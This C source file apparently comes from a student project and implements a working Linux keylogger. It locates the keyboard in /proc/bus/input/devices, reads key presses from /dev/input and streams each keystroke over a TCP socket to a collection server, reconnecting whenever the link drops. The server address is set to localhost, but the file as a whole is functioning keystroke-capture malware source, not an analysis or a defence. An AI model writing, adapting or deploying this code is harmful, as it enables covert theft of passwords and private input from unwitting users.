#include "gnl.h"
#include <ctype.h>
#include <signal.h>

const char *keymap[] = {
    [KEY_A] = "A", [KEY_B] = "B", [KEY_C] = "C", [KEY_D] = "D",
    [KEY_E] = "E", [KEY_F] = "F", [KEY_G] = "G", [KEY_H] = "H",
    [KEY_I] = "I", [KEY_J] = "J", [KEY_K] = "K", [KEY_L] = "L",
    [KEY_M] = "M", [KEY_N] = "N", [KEY_O] = "O", [KEY_P] = "P",
    [KEY_Q] = "Q", [KEY_R] = "R", [KEY_S] = "S", [KEY_T] = "T",
    [KEY_U] = "U", [KEY_V] = "V", [KEY_W] = "W", [KEY_X] = "X",
    [KEY_Y] = "Y", [KEY_Z] = "Z",

    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
    [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
    [KEY_9] = "9", [KEY_0] = "0",

    [KEY_SPACE] = "SPACE",
    [KEY_ENTER] = "ENTER",
    [KEY_BACKSPACE] = "BACKSPACE",
    [KEY_TAB] = "TAB",
    [KEY_ESC] = "ESC",

    [KEY_MINUS] = "-", [KEY_EQUAL] = "=", 
    [KEY_LEFTBRACE] = "[", [KEY_RIGHTBRACE] = "]",
    [KEY_BACKSLASH] = "\\", [KEY_SEMICOLON] = ";",
    [KEY_APOSTROPHE] = "'", [KEY_GRAVE] = "`",
    [KEY_COMMA] = ",", [KEY_DOT] = ".", [KEY_SLASH] = "/",

    [KEY_LEFTSHIFT] = "LSHIFT", [KEY_RIGHTSHIFT] = "RSHIFT",
    [KEY_LEFTCTRL] = "LCTRL", [KEY_RIGHTCTRL] = "RCTRL",
    [KEY_LEFTALT] = "LALT", [KEY_RIGHTALT] = "RALT",
    [KEY_CAPSLOCK] = "CAPSLOCK",

    [KEY_UP] = "UP", [KEY_DOWN] = "DOWN",
    [KEY_LEFT] = "LEFT", [KEY_RIGHT] = "RIGHT",

    [KEY_F1] = "F1", [KEY_F2] = "F2", [KEY_F3] = "F3", [KEY_F4] = "F4",
    [KEY_F5] = "F5", [KEY_F6] = "F6", [KEY_F7] = "F7", [KEY_F8] = "F8",
    [KEY_F9] = "F9", [KEY_F10] = "F10", [KEY_F11] = "F11", [KEY_F12] = "F12",

    [KEY_KP0] = "NUMPAD_0",
    [KEY_KP1] = "NUMPAD_1",
    [KEY_KP2] = "NUMPAD_2",
    [KEY_KP3] = "NUMPAD_3",
    [KEY_KP4] = "NUMPAD_4",
    [KEY_KP5] = "NUMPAD_5",
    [KEY_KP6] = "NUMPAD_6",
    [KEY_KP7] = "NUMPAD_7",
    [KEY_KP8] = "NUMPAD_8",
    [KEY_KP9] = "NUMPAD_9",
    [KEY_KPDOT] = "NUMPAD_DOT",
    [KEY_KPENTER] = "NUMPAD_ENTER",
    [KEY_KPSLASH] = "NUMPAD_SLASH",
    [KEY_KPASTERISK] = "NUMPAD_ASTERISK",
    [KEY_KPMINUS] = "NUMPAD_MINUS",
    [KEY_KPPLUS] = "NUMPAD_PLUS",
    [KEY_NUMLOCK] = "NUMLOCK",
};

void read_event(char *event)
{
    signal(SIGPIPE, SIG_IGN);
    while (1) {
        printf("ca repart ici ?\n");
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("socket client");
            exit(EXIT_FAILURE);
        }

        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(4243);
        inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr);
        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            perror("connection au serveur échouée");
            sleep(10);
            continue;
        }
        char *device = malloc(strlen(event) + strlen("/dev/input/") + 1);
        if (!device)
        {
            perror("malloc");
            close(sock);
            free(event);
            exit(EXIT_FAILURE);
        }
        strcpy(device, "/dev/input/");
        strcat(device,event);
        int fd = open(device, O_RDONLY);
        if (fd < 0)
        {
            perror("open input");
            close(sock);
            free(device);
            free(event);
            exit(EXIT_FAILURE);
        }
        fd_set read_fds;
        struct input_event ev;

        while (1) {
            FD_ZERO(&read_fds);
            FD_SET(fd, &read_fds);

            int ret = select(fd + 1, &read_fds, NULL, NULL, NULL);
            if (ret < 0) {
                perror("Erreur avec select()");
                break;
            }

            if (FD_ISSET(fd, &read_fds)) {
                ssize_t bytes = read(fd, &ev, sizeof(struct input_event));
                if (bytes == sizeof(struct input_event)) {
                    if (ev.type == EV_KEY && ev.value == 1) 
                    {
                        const char *key = keymap[ev.code];
                        if (key) 
                        {
                            char buffer[64];
                            snprintf(buffer, sizeof(buffer), "[%s]", key);
                            int ret = send(sock, buffer, strlen(buffer), 0);
                            fflush(stdout);
                            if (ret == -1)
                                break ;
                            printf("ret : %d\n", ret);
                            printf("[%ld.%06ld][%s]\n", ev.time.tv_sec, ev.time.tv_usec, key);
                        } else {
                            printf("[%ld.%06ld][UNKNOWN CODE: %d]\n", ev.time.tv_sec, ev.time.tv_usec, ev.code);
                        }
                    }
                } else {
                    perror("Erreur de lecture");
                    break;
                }
            }
        }
        fflush(stdout);
        printf("ca va ici ? \n");
        close(fd);
        close(sock);
        free(device);
    }
}

static int	get_file_len(int fd)
{
	int		i;
	char	*line;

	line = NULL;
	i = 0;
	while (get_next_line(fd, &line) == 1)
	{
		i++;
		free(line);
	}
	free(line);
	close(fd);
	return (i);
}

char *retrieve_event(char **device_content)
{
	bool	detected_n = false;
	int		i = 0;

	while (device_content[i])
	{
		if (strstr(device_content[i], "Name") &&
			strstr(device_content[i], "keyboard"))
			detected_n = true;
		if (detected_n)
		{
			if (strstr(device_content[i], "Handlers"))
			{
				char    *start = strstr(device_content[i], "event");

				if (start)
				{
					size_t	len = 0;

					while (start[len] && !isspace((unsigned char)start[len]))
						++len;
					char	*event = malloc(len + 1);
					if (!event)
						return (NULL);
					memcpy(event, start, len);
					event[len] = '\0';
					return (event);
				}
			}
		}
		++i;
	}
	return (NULL);
}

char *parse_device_name()
{
    int fd = open("/proc/bus/input/devices", O_RDONLY);
    char *event;
    if (fd < 0)
    {
        perror("can't read the content of devices");
        exit(EXIT_FAILURE);
    };
    char *line;
    size_t size = get_file_len(fd);
    fd = open("/proc/bus/input/devices", O_RDONLY);
    if (fd < 0)
    {
        perror("can't read the content of devices");
        exit(EXIT_FAILURE);
    };
    char **device_content = calloc(size + 1, sizeof(char *));
    int i = 0;
    while (i < (int)size && get_next_line(fd, &line) == 1)
    {
        device_content[i++] = ft_strdup(line);
        free(line);
    }
    device_content[i] = NULL;
    event = retrieve_event(device_content);
    for (size_t i = 0; i <= size; i++) {
        free(device_content[i]);
        device_content[i] = NULL;
    }
    free(device_content);
    device_content = NULL;
    close(fd);
    return event;
}

void launch_keylogger() {
    char *event = parse_device_name();
    if (!event) {
        fprintf(stderr, "Impossible de trouver le périphérique clavier\n");
        return ;
    }
    read_event(event);
    free(event);
}

// int main() {
//     read_event(parse_device_name());
//     return 0;
// }